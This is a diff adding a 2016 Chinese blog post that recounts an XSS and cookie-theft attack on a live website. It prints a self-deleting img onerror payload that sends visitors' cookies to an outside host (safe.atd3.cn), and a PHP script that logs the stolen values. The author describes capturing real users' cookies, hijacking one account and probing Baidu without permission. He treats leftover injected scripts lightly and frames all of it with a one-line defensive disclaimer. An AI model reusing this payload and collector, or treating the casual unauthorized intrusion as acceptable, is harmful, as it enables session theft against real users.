@@ -1,0 +1,369 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  XSS注入Session Fixation攻击 |   Hello! I am DXkite </title>
+
+ 
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+
+  <link rel="stylesheet" href="/nayo.min.css"> 
+</head>  
+  <body>   
+    
+      <header class="header">
+	
+  <nav class="header-nav">        
+   
+    <span class="iconfont icon-menu mobile-toggle"></span>   	
+
+    <div class="header-menu">          
+              
+            
+
+              <a class="header-menu-link" id="header-menu-home" href="/">首页</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-archives" href="/archives">归档</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-tags" href="/tags">标签</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-about" href="/about">关于</a>     
+
+            
+            
+            
+
+              <a class="iconfont icon-menu-search header-menu-link" id="header-menu-search"></a>
+
+            
+                
+    </div>  
+    
+  </nav>
+</header>   
+
+      <div class="container">       
+          
+          
+            <section class="main">  
+          
+
+          <article class="post">
+  
+	<div class="post-header">
+
+	<p class="post-title">	
+		XSS注入Session Fixation攻击
+	</p>
+			
+
+	<div class="meta-info">	
+	<span>
+		7月 23, 2016
+	</span>
+
+	
+	
+		<i class="iconfont icon-words"></i>
+		<span>
+			2116
+		</span>
+	
+</div>
+
+</div> 
+	 
+
+	  <div class="post-content slideDownMin">
+
+		
+
+			
+					<p>第一次实地操作web渗透？</p>
+<a id="more"></a>
+<p>啊哈哈，结果还是喜人的，附上Cookie登陆后的图：</p>
+<p><img src="4031893413.png" alt="Cookie 登陆"></p>
+<p>常规信息已经打码，本次web渗透的成功原因有两个</p>
+<h2 id="1-XSS注入漏洞若干"><a href="#1-XSS注入漏洞若干" class="headerlink" title="1. XSS注入漏洞若干"></a>1. XSS注入漏洞若干</h2><p>为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，先贴测试脚本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> </span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">"var s=document.createElement('script');</span></span></span><br><span class="line"><span class="tag"><span class="string">s.setAttribute('src','//safe.atd3.cn/a?b='+document.domain+'&amp;c='+document.cookie);</span></span></span><br><span class="line"><span class="tag"><span class="string">var b=document.all[0];</span></span></span><br><span class="line"><span class="tag"><span class="string">b.appendChild(s);</span></span></span><br><span class="line"><span class="tag"><span class="string">b.removeChild(s);</span></span></span><br><span class="line"><span class="tag"><span class="string">this.parentNode.removeChild(this);"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url<br>然后会调用<code>onerror</code>事件，在<code>onerror</code>事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的<code>cookie</code>和域名<br>反正这是我的一个简易后台代码,PHP做服务器端的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=<span class="string">'cookie.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($file_name))</span><br><span class="line">	file_put_contents($file_name,<span class="string">"&lt;?php \$a=[];\n"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'QUERY_STRING'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	file_put_contents($file_name,<span class="string">'$a[]=\''</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>].<span class="string">"';\n"</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>好了，前期准备做好了，接下来开始注入测试，，，进入网站，，<br>直接插入一个简单的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">"console.log('xss');"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体—markdown编辑器来做示范吧,如图</p>
+<p><img src="2242201383.png" alt="用Markdown编辑"></p>
+<p>咳咳，，嗯，我顺带回答了问题，看看注入后的效果</p>
+<p><img src="31655912.png" alt="注入脚本查看"></p>
+<p>啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里</p>
+<p><img src="1244653846.png" alt="唯一的痕迹"></p>
+<p>然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子</p>
+<p><img src="3364299923.png" alt="倒霉的小伙子"></p>
+<p>侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，<br>接下来是第二个成功原因<code>session fixation</code>漏洞</p>
+<h2 id="2-session-fixation-攻击"><a href="#2-session-fixation-攻击" class="headerlink" title="2. session fixation 攻击"></a>2. session fixation 攻击</h2><p>第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，<br>毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图</p>
+<p><img src="/images/placeholder.png" alt="XSS防范" data-src="528666995.png" class="lazyload"></p>
+<p>看图<code>HTTP</code>的红色标记，，这个是标记了<code>HttpOnly</code>的cookie，通过这个，我们用脚本<br><code>document.cookie</code>获取的cookie就不完整了，，，如图，，</p>
+<p><img src="/images/placeholder.png" alt="脚本获取的cookie" data-src="2533359386.png" class="lazyload"></p>
+<p>可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。<br>还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎<br>cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，</p>
+<p><img src="/images/placeholder.png" alt="修改cookie" data-src="3441714176.png" class="lazyload"></p>
+<p>通过抓包软件，抓到的数据包可以证明：</p>
+<p><img src="/images/placeholder.png" alt="一个cookie的GET" data-src="3100487257.png" class="lazyload"></p>
+<p>然后还有更无语的,那个我特么则怎么都获取不到的<code>HttpOnly</code>的cookie直接出现在了返回的包里，也是没得讲了</p>
+<p><img src="/images/placeholder.png" alt="返回设置cookie" data-src="2520477158.png" class="lazyload"></p>
+<p>就问傻不傻~！session fixation攻击，，？应该就是叫这个来着<br>咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，</p>
+<p><img src="/images/placeholder.png" alt="返回的页面" data-src="1298714253.png" class="lazyload"></p>
+<p>哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。<br>这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，<br>已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。<br>啊哈哈，好了，总结，，</p>
+<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>在此次渗透过程中我使用了三种方式</p>
+<ol>
+<li>XSS 注入</li>
+<li>session fixation 探测</li>
+<li>iframe 劫持<br> 这个东西麽。网站对其有防范。。。就不截图了</li>
+</ol>
+<p>在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie<br>直接变成了未登陆状态，咳，还意外发现了这个：</p>
+<p><img src="/images/placeholder.png" alt="百度的招聘" data-src="4207819758.png" class="lazyload"></p>
+<p>所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个<code>F12</code>键，求职单就来了</p>
+<blockquote>
+<p>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为</p>
+</blockquote>
+<hr>
+<p>刚刚又去看了下盗取的后台，尽管和网站负责人交流过过后，还是有部分脚本没删除干净，不过，怪我咯~</p>
+<p><img src="/images/placeholder.png" alt="后台盗取的Cookie" data-src="2401380495.png" class="lazyload"><br><img src="/images/placeholder.png" alt="和负责人的交流" data-src="2350100276.png" class="lazyload"></p>
+  	
+					
+	  </div>     
+	  
+
+	
+<div class="post-meta">
+      
+        <i class="iconfont icon-category"></i>       
+        <a class="category-link" href="/categories/技术分享/">技术分享</a> 	
+     
+      	
+
+      
+        <i class="iconfont icon-tag"></i>     
+          <a class="tag-link" href="/tags/PHP/">PHP</a> <a class="tag-link" href="/tags/Session-Fixation/">Session Fixation</a> <a class="tag-link" href="/tags/XSS/">XSS</a> <a class="tag-link" href="/tags/网络安全/">网络安全</a>    
+      	
+</div>
+
+
+
+
+
+<div class="post-footer">
+  <div class="pf-left">
+      <img class="pf-avatar lazyload" src="/images/placeholder.png" data-src="/dxkite.png">
+      <p class="pf-des">Hello! I am DXkite</p>
+  </div>
+
+  <div class="pf-right">           
+      <div class="pf-links">
+        
+
+
+
+
+<span class="donate-btn">
+	<span class="iconfont icon-donate"></span>
+</span>
+
+
+<div id="donate-box" class="sildeUpMin">
+
+	<span class="donate-cancel iconfont icon-cancel"></span>
+
+	<div class="donate-img-box">
+		<img id="donate-qr-wechat" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate1.png">	
+		<img id="donate-qr-alipay" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate2.png">	
+	</div>
+
+	<span class="donate-word">世界美好 你也是</span>
+
+	<div class="donate-list">
+		<span class="iconfont icon-donate-wechat"></span>
+		<span class="iconfont icon-donate-alipay"></span>
+	</div>
+
+</div>
+
+ 
+        
+	
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+	
+	<span class="share-btn">
+	<span class="iconfont icon-share"></span>
+	</span>
+
+
+	<div class="-mob-share sildeUpMin">
+		   			             
+            <a class="iconfont  icon-share-qq -mob-share-qq"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weixin -mob-share-weixin"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weibo -mob-share-weibo"></a>		
+     	   			             
+            <a class="iconfont  icon-share-douban -mob-share-douban"></a>		
+     	   			             
+            <a class="iconfont  icon-share-facebook -mob-share-facebook"></a>		
+     	   			             
+            <a class="iconfont  icon-share-twitter -mob-share-twitter"></a>		
+     	   			             
+            <a class="iconfont  icon-share-google -mob-share-google"></a>		
+     	   
+	</div>	
+
+      </div>  
+    <nav class="pf-paginator">
+      
+         
+          <a href="/2018/06/06/ciscn-center-zone-q03/" data-hover="CISCN 2018 华中赛区 Q03 题解">上一篇</a>      
+            
+        
+            
+  </nav>   
+  </div>
+</div> 
+	
+
+
+    
+    <div id="disqus_thread"></div>
+
+    <script>
+    (function() { 
+    var d = document, s = d.createElement('script');
+    s.src = 'https://'+'lemonreds'+'.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());    
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+    </noscript>
+
+
+	
+</article>
+
+          </section> 
+      </div>            
+    
+    <a id="backTop">
+      <span>
+        <i class="iconfont icon-backtotop"></i>
+      </span>
+    </a> 
+
+  
+    
+    <div class="search-container sildeUpMin">
+        <div class="search-header">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">  
+            <span class="search-cancel iconfont icon-cancel"></span>
+        </div>
+        <div id="search-result" class="search-result"></div>
+    </div>
+ 
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/favicon.png">   
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">首页
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">归档
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">标签
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">关于
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
+            
+         
+      
+</div>        
+    
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d7aee75a7326ba3e59244e2db26823c8"; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+
+     
+    
+
+
+
+
+<footer id="footer">	    
+
+		
+		<div class="footer-copyright">
+		&copy;
+		
+		2018		
+	
+		DXkite
+		<br>
+
+		Theme By
+		<a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>	
+		</div>			
+	 
+</footer>   
+
+  
+
+    <script src="/nayo.bundle.js"></script>           
+  </body>        
+</html>
